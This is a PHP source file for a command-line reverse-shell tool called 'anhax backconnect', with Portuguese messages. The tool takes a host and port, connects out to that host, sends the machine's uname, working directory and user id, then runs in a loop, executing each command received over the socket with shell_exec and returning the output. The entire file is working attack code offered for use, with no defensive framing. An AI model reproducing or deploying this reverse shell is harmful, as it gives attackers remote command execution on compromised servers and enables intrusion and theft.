<?php
  /*
  * ------ BACK CONNECT -------
  * Desenvolvido por João Artur
  * anhax @2017
  * www.github.com/JoaoArtur
  */
  error_reporting(0);

  abstract class anhax {
    public static $argumento;
    public static $comandos;
    public static $porta;
    public static $host;

    public static function iniciar() {
      global $argv;

      echo "\033[31m[>] anhax backconnect v1.0
[>] developed by João Artur (K3N1)\033[1m\n\n";


      self::comandos();
      self::verificarArgumentos($argv);
    }
    public static function comandos() {
      self::$comandos['-h'] = 'host';
      self::$comandos['-p'] = 'porta';
    }
    public static function porta($porta) {
      self::$porta = $porta;
      echo "Porta: ".$porta."\n";
    }
    public static function host($host) {
      self::$host = $host;
      echo "Host: ".$host."\n";
    }
    public static function ajuda() {
      echo "-h    =    Definir IP da máquina\n";
      echo "-p    =    Definir porta de acesso\n";
    }
    public static function executarBackconnect() {
      if (self::$porta != null and self::$host != null) {
        $sockfd=fsockopen(self::$host, self::$porta, $errno, $errstr);
        if($errno != 0) {
            echo "\033[0m\033[31mConexão negada\n";
        } else if (!$sockfd) {
            echo "\033[0m\033[31mConexão negada\n";
        }
        else {
         fputs($sockfd, "\033[31m[>] anhax backconnect v1.0\n[>] developed by João Artur (K3N1)\033[0m\n\n");
         $pwd = shell_exec("pwd");
         $sysinfo = shell_exec("uname -a");
         $id = shell_exec("id");
         $len = 1337;
         fputs($sockfd ,"\033[0m".$sysinfo . "\n" );
         fputs($sockfd ,"\033[0m".$pwd . "\n" );
         fputs($sockfd ,"\033[0m".$id ."\n" );
         while(!feof($sockfd))
         {
            $cmd = str_replace("\n",'',shell_exec('whoami'))."@".str_replace("\n",'',shell_exec('hostname'))." > ";
            fputs($sockfd, $cmd);
            $comando = fgets($sockfd, $len);
            $comandoSaida = shell_exec($comando);
            if ($comandoSaida != null) {
              fputs($sockfd, $comandoSaida."\n");
            } else {
              fputs($sockfd, '[+] Comando não encontrado'."\n");
            }
         }
         fclose($sockfd);
        }
      } else {
        echo "[+] Verifique se você preencheu todas as dependências corretamente.\n";
      }
    }
    public static function verificarArgumentos($argumentos) {
      if (count($argumentos) == 1) {
        self::ajuda();
      } else {
        unset($argumentos[0]);
        foreach ($argumentos as $key => $value) {
          if (isset(self::$comandos[$value])) {
            $atual_cmd = self::$comandos[$value];
            $atual_arg = $key;
            if (isset($argumentos[$atual_arg+1])) {
              self::$atual_cmd($argumentos[$atual_arg+1]);
            } else {
              echo "[+] Verifique se você preencheu todas as dependências corretamente.\n";
            }
          }
        }
        self::executarBackconnect();
      }
    }

  }

  anhax::iniciar();

?>
